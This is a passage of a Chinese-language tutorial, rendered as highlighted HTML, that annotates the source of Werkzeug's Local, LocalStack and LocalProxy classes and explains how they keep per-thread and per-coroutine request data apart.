the data in the locals for this context.  Call        this at the end of the request or use `make_middleware()`.        """</span>        <span class="token keyword">for</span> local <span class="token keyword">in</span> self<span class="token punctuation">.</span>locals<span class="token punctuation">:</span>            release_local<span class="token punctuation">(</span>local<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_middleware</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Wrap a WSGI application so that cleaning up happens after        request end.        """</span>        <span class="token keyword">def</span> <span class="token function">application</span><span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> ClosingIterator<span class="token punctuation">(</span>app<span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>cleanup<span class="token punctuation">)</span>        <span class="token keyword">return</span> application    <span class="token keyword">def</span> <span class="token function">middleware</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> update_wrapper<span class="token punctuation">(</span>self<span class="token punctuation">.</span>make_middleware<span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">,</span> func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"&lt;%s storages: %d>"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>locals<span class="token punctuation">)</span><span class="token punctuation">)</span>@implements_bool<span class="token keyword">class</span> <span class="token class-name">LocalProxy</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__local"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token string">"__wrapped__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> local<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_LocalProxy__local"</span><span class="token punctuation">,</span> local<span class="token punctuation">)</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> callable<span class="token punctuation">(</span>local<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># "local" is a callable that is not an instance of Local or</span>            <span class="token comment" spellcheck="true"># LocalManager: mark it as a wrapped function.</span>            object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__wrapped__"</span><span class="token punctuation">,</span> local<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_get_current_object</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Return the current object.  This is useful if you want the real        object behind the proxy at a time for performance reasons or because        you want to pass the object into a different context.        """</span>        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__local<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"no object bound to %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>    @property    <span class="token keyword">def</span> <span class="token function">__dict__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__        <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> AttributeError<span class="token punctuation">(</span><span class="token string">"__dict__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            obj <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"&lt;%s unbound>"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__        <span class="token keyword">return</span> repr<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__bool__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> bool<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">__unicode__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> unicode<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># noqa</span>        <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>            <span class="token keyword">return</span> repr<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__dir__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> dir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RuntimeError<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">"__members__"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> dir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value    <span class="token keyword">def</span> <span class="token function">__delitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> self<span class="token punctuation">.</span>_get_current_object<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看<code>Local</code>类</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># werkzeug.local</span><span class="token comment" spellcheck="true"># 尝试导入线程或协程</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">from</span> greenlet <span class="token keyword">import</span> getcurrent <span class="token keyword">as</span> get_ident<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">from</span> thread <span class="token keyword">import</span> get_ident    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">from</span> _thread <span class="token keyword">import</span> get_ident  <span class="token keyword">def</span> <span class="token function">release_local</span><span class="token punctuation">(</span>local<span class="token punctuation">)</span><span class="token punctuation">:</span>    local<span class="token punctuation">.</span>__release_local__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Local</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    class object:    __slots__: Union[Text, Iterable[Text]]    object.__slots__:这个类变量可以赋值为字符串,或可迭代对象,它会对已声明的变量保留空间,并阻止自动为每个实例创建__dict__和__weakref__    >>> foo = Foo()    >>> dir(foo)    ['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__ini    t__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setat    tr__', '__sizeof__', '__slots__', '__str__', '__subclasshook__', 'test']    """</span>    __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__storage__"</span><span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        __setattr__ ==> x.any =value 赋值语句时使用         object.__setattr__(self, "__storage__", {})         相当于:          localTest = Local()         localTest.__storage__ = {}         等于给 Local()实例添加一个属性 ,并且值为列表         这里相当于为Local()实例添加了2个属性值         Local().__storage__ = {}         Local().__ident_func__ = get_ident         get_ident 是线程的唯一标识符        """</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__storage__"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">,</span> get_ident<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> iter<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__storage__<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> proxy<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Create a proxy for a name."""</span>        <span class="token keyword">return</span> LocalProxy<span class="token punctuation">(</span>self<span class="token punctuation">,</span> proxy<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__release_local__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__storage__<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    运算符重载    __getattr__ ==> x.any 获取不存在的属性    __setattr__ ==> x.any = value 属性赋值语句    __delattr__ ==> del x.any 删除属性    实现了访问Local()实例属性值的操作    """</span>           <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        storage={            ident:{                name:value            }        }        return storage[ident][name]        """</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__storage__<span class="token punctuation">[</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> AttributeError<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__setattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        实现了一个字典对象保存如下:        storage={            ident:{                name:value            }        }        storage={            线程唯一标识符:{                name:value            }        }        """</span>        ident <span class="token operator">=</span> self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span>        storage <span class="token operator">=</span> self<span class="token punctuation">.</span>__storage__        <span class="token keyword">try</span><span class="token punctuation">:</span>            storage<span class="token punctuation">[</span>ident<span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> value        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            storage<span class="token punctuation">[</span>ident<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token punctuation">:</span> value<span class="token punctuation">}</span>    <span class="token keyword">def</span> <span class="token function">__delattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">del</span> self<span class="token punctuation">.</span>__storage__<span class="token punctuation">[</span>self<span class="token punctuation">.</span>__ident_func__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span>        <span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> AttributeError<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""以上实现了每个线程对应的键值对,也就是每个线程自己的 变量的集合"""</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上可以看到:</p><ul><li><code>Local()</code> 实例的数据都保存在<code>__storage__</code> 属性中, 这个属性是一个嵌套的字典,它类似与:</li></ul><pre class="line-numbers language-python"><code class="language-python">local <span class="token operator">=</span> Local<span class="token punctuation">(</span><span class="token punctuation">)</span>local<span class="token punctuation">.</span>__strorage__<span class="token operator">=</span><span class="token punctuation">{</span>    ident<span class="token punctuation">:</span><span class="token punctuation">{</span>                           <span class="token comment" spellcheck="true"># 线程或协程的唯一标识符</span>        name<span class="token punctuation">:</span>value            <span class="token comment" spellcheck="true"># 线程或协程中的变量对应</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>每一个<code>client</code> 都会有唯一一个的一个线程或携程与之对应,这样就实现了线程(协程)隔离</li></ul><pre class="mermaid">> graph LRA(client1)B(127.0.0.1:5000)C(Thread1)D(name:value)A1(client2)B1(127.0.0.1:5000)C1(Thread2)D1(name:value)A-->BA1-->B1B-->CB1-->C1C-->AC-->DC1-->A1C1-->D1</pre><ul><li><code>ident</code> 是自动对应的当访问实例的属性时,就自动变成了访问内部的字典</li></ul><pre class="line-numbers language-python"><code class="language-python">local <span class="token operator">=</span> Local<span class="token punctuation">(</span><span class="token punctuation">)</span>local<span class="token punctuation">.</span>__strorage__<span class="token operator">=</span><span class="token punctuation">{</span>    ident<span class="token punctuation">:</span><span class="token punctuation">{</span>                           <span class="token comment" spellcheck="true"># 线程或协程的唯一标识符</span>        name<span class="token punctuation">:</span>value            <span class="token comment" spellcheck="true"># 线程或协程中的变量对应</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># ident 是唯一确定的,假设标识符是:</span>ident <span class="token operator">=</span> <span class="token number">123</span><span class="token comment" spellcheck="true"># 访问local.name相当于</span>local<span class="token punctuation">.</span>name <span class="token operator">==</span><span class="token operator">></span> Local<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getattr__<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span>local<span class="token punctuation">.</span>__storage__<span class="token punctuation">[</span>ident<span class="token punctuation">]</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 自动变成访问内部字典</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Local</code> 类内部实现了<code>__release_local__</code> ,用来清空当前线程(协程)的数据.</li><li><code>__call__</code> 返回一个<code>LocalProxy</code> 对象.</li></ul><hr><p>接下来看另外一个类<code>LocalStack</code>,它用来实现一个堆栈结构.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">LocalStack</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token triple-quoted-string string">"""  实例化一个 Local()对象  """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_local <span class="token operator">=</span> Local<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__release_local__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__release_local__<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_get__ident_func__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__ident_func__    <span class="token keyword">def</span> <span class="token function">_set__ident_func__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"__ident_func__"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    __ident_func__ <span class="token operator">=</span> property<span class="token punctuation">(</span>_get__ident_func__<span class="token punctuation">,</span> _set__ident_func__<span class="token punctuation">)</span>    <span class="token keyword">del</span> _get__ident_func__<span class="token punctuation">,</span> _set__ident_func__    <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">_lookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> self<span class="token punctuation">.</span>top            <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>                <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"object unbound"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> rv        <span class="token keyword">return</span> LocalProxy<span class="token punctuation">(</span>_lookup<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""push,pop,top 实现了堆栈的操作."""</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        getattr(x,y)==>x.y getattr()能够不返回报错而返回一个默认值        rv = Local().stack 有就返回,没有就返回None        rv=Local().stack ==> 访问内部字典对象的值,==>Local().__storage__[ident][stack]        初始为没有值,就指定一个空列表        Local().stack = []        push(a)=>Local().stack.append(a)        """</span>        rv <span class="token operator">=</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"stack"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>stack <span class="token operator">=</span> rv <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        rv<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>        <span class="token keyword">return</span> rv    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        删除列表中元素        """</span>        stack <span class="token operator">=</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">,</span> <span class="token string">"stack"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>        <span class="token keyword">if</span> stack <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> None        <span class="token keyword">elif</span> len<span class="token punctuation">(</span>stack<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            release_local<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_local<span class="token punctuation">)</span>            <span class="token keyword">return</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    @property    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        self._local.stack[-1] ==> Local().stack[-1]==>Local().__storage__[ident][stack][-1]        top() 永远指向了最开始的元素        """</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>AttributeError<span class="token punctuation">,</span> IndexError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><code>localProxy</code>:负责把所有对自己的操作转发给内部的 <code>Local</code> 对象,重点关注它的<code>__call__</code>函数,它会返回一个<code>Local()</code> 实例对象</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x@implements_bool<span class="token keyword">class</span> <span class="token class-name">LocalProxy</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    __slots__ 魔法属性    """</span>    __slots__ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"__local"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token string">"__wrapped__"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> local<span class="token punctuation">,</span> name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        object.__setattr__(self, "_LocalProxy__local", local)表示会为实例创建一个属性值        def local(name):            return 1        localproxy = LocalProxy(local,name)        localproxy.__LocalProxy__local = local        localproxy.__name__ = name        """</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_LocalProxy__local"</span><span class="token punctuation">,</span> local<span class="token punctuation">)</span>        object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>        <span class="token keyword">if</span> callable<span class="token punctuation">(</span>local<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># "local" is a callable that is not an instance of Local or</span>            <span class="token comment" spellcheck="true"># LocalManager: mark it as a wrapped function.</span>            object<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"__wrapped__"</span><span class="token punctuation">,</span> local<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_get_current_object</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        这里有一个让人疑惑的参数. self.__local,其实这个代表了类的一个私有变量,        当访问 self.__local ==> self.__LocalProxy__local,而 __LocalProxy__local        恰好是上面实现的 object.__setattr__(self, "_LocalProxy__local", local)        所以其实 self.__local ==> local==>等价于访问传递进入的 local 变量.        这就实现了访问某个单一的 Local()        """</span>        <span class="token comment" spellcheck="true"># Local,LocalStack 都实现了 __release_local__ 方法</span>        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__local<span class="token punctuation">,</span> <span class="token string">"__release_local__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    